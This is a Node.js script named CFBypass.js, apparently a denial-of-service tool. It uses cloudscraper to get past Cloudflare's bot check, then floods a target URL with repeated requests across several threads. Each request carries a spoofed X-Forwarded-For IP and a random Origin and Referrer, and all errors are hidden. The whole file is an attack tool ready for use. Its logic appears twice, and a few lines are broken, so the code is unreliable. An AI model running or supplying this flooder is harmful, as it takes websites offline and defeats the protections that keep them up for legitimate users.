var cloudscraper = require('cloudscraper');
var request=require('request');
var randomstring = require("randomstring");

var args = process.argv.slice(2);

randomByte = function() {
    return Math.round(Math.random()*256);
}
process.on('uncaughtException', () => { "Hi" });
process.on('unhandledRejection', () => { "Hi" });

if (process.argv.length <= 2) {
    console.log("Usage: node CFBypass.js <url> <time>");
    console.log("Usage: node CFBypass.js <http://example.com> <60> <15>");
    console.log(`[Usage] node cf.js <url> <time> <threads>`);
    console.log("[Credits] Thanks to slpkbt (on github) for improving this bypass!")
    console.log(`[Example] node cf.js example.com 60`);
    console.log(`[Warning] Do not use on .edu .gov domains`);
    process.exit(-1);
}
var url = process.argv[2];
var time = process.argv[3];

setInterval
var int = setInterval(() => {

    var cookie = '';
    var useragent = '';
    cloudscraper.get(url, function(error, response, body) {
        if (error) {
            //pass
        } else {
            var parsed = JSON.parse(JSON.stringify(response));
            cookie = (parsed["request"]["headers"]["cookie"]);
            useragent = (parsed["request"]["headers"]["User-Agent"]);
        }
        // console.log(cookie + '/' + useragent)
        var rand = randomstring.generate({
            length: 10,
            charset: 'abcdefghijklmnopqstuvwxyz0123456789'
          });
            var ip = randomByte() +'.' +
            randomByte() +'.' +
            randomByte() +'.' +
            randomByte();
            const options = {
            url: url,
            headers: {
                'User-Agent': useragent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Upgrade-Insecure-Requests': '1',
                'cookie': cookie,
                'Origin': 'http://' + rand + '.com',
                'Referrer': 'http://google.com/' + rand,
                'X-Forwarded-For': ip
            }
            };

            function callback(error, response, body) {
            }
            request(options);
    });    
});
setTimeout(() => clearInterval(int), time * 1000);
process.on('uncaughtException', function(err) {

});
const rIp = () => {
    const r = () => Math.floor(Math.random() * 255);
    return `${r()}.${r()}.${r()}.${r()}`;
}

const rStr = (l) => {
    const a = 'abcdefghijklmnopqstuvwxyz0123456789';
    let s = '';
    for (let i = 0; i < l; i++) {
        s += a[Math.floor(Math.random() * a.length)];
    }
    return s;
}

const threads = Number(process.argv[4]) || 1;
console.log("[Credits] Thanks to slpkbt (on github) for improving this bypass!")
console.log(`[Info] Starting ${time} seconds attack on ${url} with ${threads} threads`);

for (let i = 0; i < threads; i++) {
    const int = setInterval(() => {
        cloudscraper.get(url, function (e, r, b) {
            if (e) return;
            const cookie = r.request.headers.request.cookie;
            const useragent = r.request.headers['User-Agent'];
            const ip = rIp();
            request({
                url: url,
                headers: {
                    'User-Agent': useragent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Upgrade-Insecure-Requests': '1',
                    'cookie': cookie,
                    'Origin': 'http://' + rStr(8) + '.com',
                    'Referrer': 'http://google.com/' + rStr(10),
                    'X-Forwarded-For': ip
                }
            });
        });
    });

process.on('unhandledRejection', function(err) {
    
}); 
    setTimeout(() => clearInterval(int), time * 1000);

}